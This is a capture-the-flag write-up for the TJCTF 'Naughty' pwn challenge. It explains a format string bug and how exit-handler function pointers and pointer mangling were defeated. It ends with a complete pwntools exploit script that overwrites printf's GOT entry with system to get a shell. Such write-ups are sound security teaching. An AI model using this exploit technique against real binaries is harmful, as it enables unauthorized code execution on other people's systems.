# Naughty
Pwn, 100

>  Written by KyleForkBomb
>  Santa is getting old and can't tell everyone which list they are on anymore. Fortunately, one of his elves wrote a service to do it for him!
>  nc p1.tjctf.org 8004

Loading this into Ghidra reveals a format string bug (the binary calls `printf` on user input). This means we have arbitrary read and write. However, the binary exits immediately after the printf call, making things more difficult than a standard challenge. There is no obvious target for an overwrite.

To deal with this, I stepped through assembly in GDB looking for calls to function pointers when the program was exiting. I first found one in `_dl_fini`, which allowed me to leak a libc address and then loop back to `_start` to get another arbitrary write:

```
<_dl_fini+488>   call   DWORD PTR [esi]
```

On the second exit, the binary segfaulted before reaching `_dl_fini`, and I still needed to loop again in order to actually have my arbitrary write do anything (I chose to overwrite the GOT entry of `printf` with `system`). Since I had a libc address this time, I had more options. I found a value loaded from a libc address that was encrypted with a canary value in `__libc_start_main`:

```
<__run_exit_handlers+282> ror    eax, 0x9
<__run_exit_handlers+285> xor    eax, DWORD PTR gs:0x18
<__run_exit_handlers+292> call   eax
```

I identified the value it was XORed with on the stack, leaked it in the first `printf` execution, and forged the function pointer in the second execution. On the third loop, `printf` was overwritten with `system`, giving me a shell and thus the flag.

```python
from pwn import *

#p = process("./naughty")
#gdb.attach(p)
p = remote("p1.tjctf.org", 8004)
#p.recvuntil("?\n")
def leak():
	p.sendline(p32(0x8049cc0)+"%7$s".format(0))
	p.recvuntil("LIST ")
	p.recv(4)
	puts = u32(p.recv(4))
	one_gadget = puts - 0x067360 + 0x3cbf0
	p.interactive()
def shell():
	fptr = 0x08049bac
	got = 0x8049cc0
	printf = 0x8049cb0
	s = 171
	#s = 187
	p.sendline(p32(fptr+2)+p32(fptr)+p32(got)+'%{}x'.format(0x804-12)+'%7$hn'+'%9${}s\xff'.format(0x8420-0x804-1)+'%8$hn'+'%{}$p%{}$p'.format(s, s+1))
	leak = u32(p.recvuntil('\xff')[-5:-1])
	base = leak - 0x18D90
	system = base + 0x03cd10
	print(hex(base))
	#target = base + 0x1E9A0C
	target = base + 0x1D620C
	key = (p.recv(10), p.recv(10))
	print key
	key = int(key[1][4:]+key[0][2:4], 16)
	main = 0x8048536 ^ key
	enc = (((main << 9)|(main >> (32-9)))&0xffffffff)
	print(hex(enc))
	writes = sorted(enumerate([(enc >> 16), (enc&0xffff), (system >> 16), (system&0xffff)]), key=lambda x: x[1])
	print(writes)
	fmt = ''
	prev = 16
	for i, n in writes:
		fmt += '%{}x%{}$hn'.format(n-prev, i+7)
		prev = n
	print(fmt)
	p.sendline(p32(target+2)+p32(target)+p32(printf+2)+p32(printf)+fmt)
	p.recvuntil("?\n")
	p.interactive()
shell()
```

Flag: `tjctf{form4t_strin9s_ar3_on_th3_n1ce_li5t}`